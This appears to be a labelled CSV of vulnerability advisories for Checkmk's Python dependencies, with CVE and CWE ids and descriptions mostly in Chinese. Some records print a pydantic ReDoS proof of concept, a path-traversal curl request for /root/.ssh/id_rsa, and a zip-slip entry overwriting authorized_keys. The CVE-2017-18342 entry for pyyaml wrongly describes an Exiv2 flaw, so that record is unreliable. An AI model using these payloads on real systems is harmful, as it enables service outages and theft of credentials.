Checkmk_checkmk,protobuf,,True,CVE-2025-4565,CWE-674,2025-06-16,Protobuf 是一种用于序列化结构化数据的库，广泛应用于数据传输、配置文件保存等领域。该漏洞影响 Protobuf 的纯 Python 实现，当对含有任意数量递归组、递归消息或 SGROUP 标签的未受信任数据进行解析时，可能会超过 Python 的递归限制。攻击者可以利用这些递归结构触发无限递归，导致解析进程崩溃，从而造成拒绝服务。,2,2
Checkmk_checkmk,psutil,,True,CVE-2019-18874,CWE-415,2019-11-11,"psutil是一款基于Python的进程和系统监视库。
psutil 5.65及之前版本中存在资源管理错误漏洞。远程攻击者可借助特制数据利用该漏洞导致应用程序崩溃（拒绝服务）。",2,2
Checkmk_checkmk,psutil,,True,,CWE-362,2023-11-01,"## Overview
[psutil](https://github.com/giampaolo/psutil) is a cross-platform lib for process and system monitoring in Python

Affected versions of this package are vulnerable to Race Condition in the `files/threads/connections` process.
## Remediation
Upgrade `psutil` to version 0.5.1 or higher.
## References
- [GitHub Commit](https://github.com/giampaolo/psutil/commit/163f29d25f4c5d573fbd436e658829afe95bc1d9)
",3,0
Checkmk_checkmk,pydantic,,True,CVE-2021-29510,CWE-835,2021-05-13,"pydantic是一个应用软件。使用Python类型提示进行数据验证和设置管理。
Pydantic 存在安全漏洞。该漏洞源于程序的验证将永远以100％的CPU使用率运行。",3,0
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
Checkmk_checkmk,pydantic,,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
Checkmk_checkmk,pymysql,,True,CVE-2024-36039,CWE-89,2024-05-21,当PyMySQL 1.1.0及以下版本与未受信任的JSON输入一起使用时，由于escape_dict未能对键进行转义，导致存在SQL注入漏洞。攻击者通过构造恶意的JSON输入，可以在数据库层面执行任意SQL命令。,3,0
Checkmk_checkmk,pyopenssl,,True,CVE-2018-1000807,CWE-416,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中对X509对象的处理方法存在释放后重用漏洞。远程攻击者可利用该漏洞造成拒绝服务或执行代码。",2,0
Checkmk_checkmk,pyopenssl,,True,CVE-2013-4314,CWE-20,2013-09-09,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。pyOpenSSL是其中的一个OpenSSL接口。
pyOpenSSL 0.13之前版本中的X509Extension类中存在漏洞，该漏洞源于程序没有正确地处理X.509证书的Subject Alternative Name字段中域名中的‘’字符。中间人攻击者可借助由合法证书颁发机构所发布的特制证书，利用该漏洞欺骗任意SSL服务器。",2,0
Checkmk_checkmk,pyopenssl,,True,CVE-2018-1000808,CWE-404,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,0
Checkmk_checkmk,pypdf,,True,CVE-2025-55197,CWE-400 CWE-770,2025-08-13,pypdf 是一个由 py-pdf 开发的开源纯 Python PDF 库，主要用于拆分、合并、裁剪和转换 PDF 文件的页面。pypdf 6.0.0 之前的版本存在一个安全漏洞，该漏洞的成因是处理恶意构造的 PDF 文件时，FlateDecode 解码流过滤器会导致内存(RAM)耗尽。攻击者可以通过在 PDF 文件中嵌入恶意的交叉引用流或内容流来触发该漏洞。这种攻击在读取受影响的 PDF 文件时即可实现，尤其是在访问嵌套的 FlateDecode 过滤器时。,3,2
Checkmk_checkmk,pypdf,,True,CVE-2025-62707,CWE-834,2025-10-22,pypdf 是一个纯 Python 的免费开源 PDF 库，主要用于拆分、合并、裁剪和转换 PDF 文件的页面。在版本 6.1.3 之前，pypdf 存在一个安全漏洞，攻击者可以通过制作一个特定格式的 PDF 文件，诱使受害者打开该文件，从而导致程序在解析使用 DCTDecode 过滤器的内联图像页面内容流时进入无限循环。此漏洞的根本原因在于对内联图像页面内容流的解析缺乏对 EOF 标记的正确验证，导致程序无法跳出循环。这种情况可能导致应用程序出现性能问题或拒绝服务。,3,2
Checkmk_checkmk,pypdf,,True,CVE-2025-62708,CWE-409,2025-10-22,pypdf 是一个开源的纯 Python PDF 库，支持拆分、合并、裁剪和转换 PDF 文件的页面。它被广泛用于处理 PDF 文档的各类应用中。该漏洞存在于 6.1.3 之前的版本，攻击者可以通过构造一个特制的 PDF 文件，其中的页面内容流使用 LZWDecode 过滤器进行解析，这会导致内存使用不当，进而可能导致内存消耗过大。该问题的根本原因是对高度压缩数据的处理不当，未对使用 LZWDecode 流进行适当的内存分配和限制，导致数据放大效应。,3,2
Checkmk_checkmk,pysaml2,,True,CVE-2017-1000433,CWE-287,2017-10-30,"PySAML2是一个使用python编写的SAML2的实现。
PySAML2 4.4.0及之前的版本中存在安全漏洞，该漏洞源于程序接收任意的密码。攻击者可利用该漏洞以任意用户身份登录。",1,0
Checkmk_checkmk,pysaml2,,True,,CWE-284,2015-02-03,"## Overview
[`pysaml2`](https://pypi.python.org/pypi/pysaml2) is a Python implementation of SAML Version 2.

Affected versions of this package are vulnerable to Access Restriction Bypass

## References
- [Github Commit](https://github.com/rohe/pysaml2/commit/d21ac9a70bce0535a2f3cc3a621452ad9d0681d6)
",3,2
Checkmk_checkmk,pysaml2,,True,,CWE-200,2014-09-12,"## Overview
[`pysaml2`](https://pypi.python.org/pypi/pysaml2) is a Python implementation of SAML Version 2.

Affected versions of this package are Information Exposure.

## References
- [Github PR](https://github.com/rohe/pysaml2/pull/139)
- [Github Commit](https://github.com/rohe/pysaml2/commit/58400479eeae275f15676f1a66767c95704809cc)
",3,2
Checkmk_checkmk,pysaml2,,True,CVE-2016-10149,CWE-611,2017-01-24,"PySAML2是一个使用python编写的SAML2的实现。
PySAML2 4.4.0及之前的版本中存在XML外部实体注入漏洞。远程攻击者可通过发送特制的SAMPL XML请求或响应利用该漏洞读取任意文件。",2,2
Checkmk_checkmk,pysaml2,,True,CVE-2021-21238,CWE-347,2021-01-21,"Idpy Pysaml2是Idpy社区的一个基于Python的SAML服务器实现。
Idpy PySAML2 before 6.5.0 存在数据伪造问题漏洞，该漏洞源于存在加密签名验证错误漏洞。攻击者可利用该漏洞处理无效的XML文档。",3,0
Checkmk_checkmk,pysaml2,,True,CVE-2020-5390,CWE-347,2020-01-13,PySAML2 5.0.0之前版本中存在安全漏洞，该漏洞源于无法检查SAML文档中的签名是否被封装。攻击者可利用该漏洞绕过安全限制。,2,2
Checkmk_checkmk,pysaml2,,True,CVE-2017-1000246,CWE-330,2017-11-17,"Python package pysaml2是一个基于Python的用于在安全域之间交换验证和授权数据的SAML协议的实现。

Python package pysaml2 4.4.0及之前的版本中存在安全漏洞。攻击者可利用该漏洞获取加密数据的信息。",3,2
Checkmk_checkmk,pysaml2,,True,CVE-2021-21239,CWE-347,2021-01-21,"Idpy Pysaml2是Idpy社区的一个基于Python的SAML服务器实现。
Idpy PySAML2 before 6.5.0 存在数据伪造问题漏洞，该漏洞源于加密签名验证错误。",3,1
Checkmk_checkmk,pysaml2,,True,CVE-2016-10127,CWE-611,2017-01-12,"PySAML2是一个使用python编写的SAML2的实现。

PySAML2中存在安全漏洞。远程攻击者可利用该漏洞实施XML外部注入攻击。",1,0
Checkmk_checkmk,python-ldap,,True,,CWE-1333,2021-11-30,"https://github.com/python-ldap/python-ldap/issues/424

### Impact
The LDAP schema parser of python-ldap 3.3.1 and earlier are vulnerable to a regular expression denial-of-service attack. The issue affects clients that use ``ldap.schema`` package to parse LDAP schema definitions from an untrusted source.

### Patches
The upcoming release of python-ldap 3.4.0 will contain a workaround to prevent ReDoS attacks. The schema parser refuses schema definitions with an excessive amount of backslashes.

### Workarounds
As a workaround, users can check input for excessive amount of backslashes in schemas. More than a dozen backslashes per line are atypical.

### References
[CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [python-ldap](https://github.com/python-ldap/python-ldap) tracker
",3,0
Checkmk_checkmk,python-ldap,,True,CVE-2021-46823,CWE-1333,2021-11-30,"python-ldap是python-ldap开源的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.0之前版本存在安全漏洞，该漏洞源于 LDAP 模式解析器中存在正则表达式拒绝服务 (ReDoS) 缺陷。攻击者利用该漏洞通过发送特制的正则表达式输入导致拒绝服务。",3,0
Checkmk_checkmk,python-ldap,,True,CVE-2025-61912,CWE-116 CWE-170,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.dn.escape_dn_chars函数对x00转义不正确，可能导致客户端拒绝服务。",3,2
Checkmk_checkmk,python-ldap,,True,CVE-2025-61911,CWE-75 CWE-843,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.filter.escape_filter_chars方法在escape_mode=1模式下未正确处理list或dict类型的assertion_value参数，可能导致LDAP注入攻击。",3,2
Checkmk_checkmk,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
Checkmk_checkmk,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
Checkmk_checkmk,redis,,True,CVE-2023-28858,CWE-193,2023-03-24,"redis-py是基于Python的redis接口库。
redis-py 4.5.3之前版本存在安全漏洞。攻击者利用该漏洞可以将响应数据发送到客户端。",3,0
Checkmk_checkmk,reportlab,,True,CVE-2019-17626,CWE-91,2019-10-16,<p>ReportLab是一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。 ReportLab 3.5.26及之前版本中存在安全漏洞。远程攻击者可利用该漏洞执行代码。</p>,1,2
Checkmk_checkmk,reportlab,,True,CVE-2020-28463,CWE-918,2021-01-03,"ReportLab是丹麦ReportLab公司的一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。
Reportlab 中存在安全漏洞。该漏洞源于服务端可通过 img tags引发服务端请求伪造漏洞。以下产品及版本受到影响：Reportlab",2,0
Checkmk_checkmk,reportlab,,True,CVE-2023-33733,CWE-94,2023-05-31,"ReportLab是丹麦ReportLab公司的一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。
Reportlab v3.6.12及之前版本存在安全漏洞，该漏洞源于允许攻击者通过提供精心制作的PDF文件来执行任意代码。",2,2
Checkmk_checkmk,reportlab,,True,CVE-2019-19450,CWE-91,2023-09-20,"ReportLab是丹麦ReportLab公司的一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。
ReportLab 3.5.31 之前版本存在安全漏洞，该漏洞源于paraparser 允许远程执行代码， paraparser.py 中的 start_unichar 会评估 XML 文档中 unichar 元素中不受信任的用户输入，<unichar code=后可以跟任意 Python 代码。",1,2
Checkmk_checkmk,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
Checkmk_checkmk,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
Checkmk_checkmk,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
Checkmk_checkmk,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
Checkmk_checkmk,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
Checkmk_checkmk,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
Checkmk_checkmk,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
Checkmk_checkmk,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
Checkmk_checkmk,setuptools,,True,,CWE-19,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Man-in-the-Middle (MitM) attack.

The ssl.match_hostname function does not properly handle wildcards in hostnames, which might allow man-in-the-middle attackers to spoof servers via a crafted certificate. (same as CVE-2013-7440).

## Remediation
Upgrade `setuptools` to version 1.3 or higher.

## References
- [Pythong Bugs](https://bugs.python.org/issue17997)  
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#13)
- [Github Commit](https://github.com/pypa/setuptools/commit/38fcb3e366ee7a21ff5f0f550fe190b1326fc04b)
",3,0
Checkmk_checkmk,setuptools,,True,,CWE-399,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Denial of Service (DoS) attacks.

Algorithmic complexity vulnerability in the ssl.match_hostname function, allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.(same issue as CVE-2013-2099).

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `setuptools` to version 0.9.5 or higher.

## References
- [Python Bugs](https://bugs.python.org/issue17980)
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#095)
- [Github Commit](https://github.com/pypa/setuptools/commit/7ddd872c63a9465340eadae59868d85ac1d43e67)
",3,2
Checkmk_checkmk,setuptools,,True,,CWE-22,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Directory Traversal.

`ez_setup._extractall()` doesn't validate the tar file members. `member.name` can start with `/` or to contain `/` which malicious attacker can exploit to Directory Traversal attacks.

## Details
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```


## Remediation
Upgrade `setuptools` to version 3.0 or higher.

## References
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#30)
- [Github Issue](https://github.com/pypa/setuptools/issues/7)
- [Github Commit](https://github.com/pypa/setuptools/commit/4c7aaccacb0a756f45862826025bfdd579195d1e)
",3,2
Checkmk_checkmk,setuptools,,True,CVE-2022-40897,CWE-1333,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Python Packaging Authority (PyPA) setuptools 65.3.0版本及之前版本存在安全漏洞。攻击者利用该漏洞通过特制的HTML包或自定义PackageIndex页面导致拒绝服务。",2,0
Checkmk_checkmk,setuptools,,True,,CWE-1333,2022-11-14,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within `package.index`.
Exploiting this vulnerability is possible in case the user is fetching malicious HTML from a package in PyPi or a custom `PackageIndex` page.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

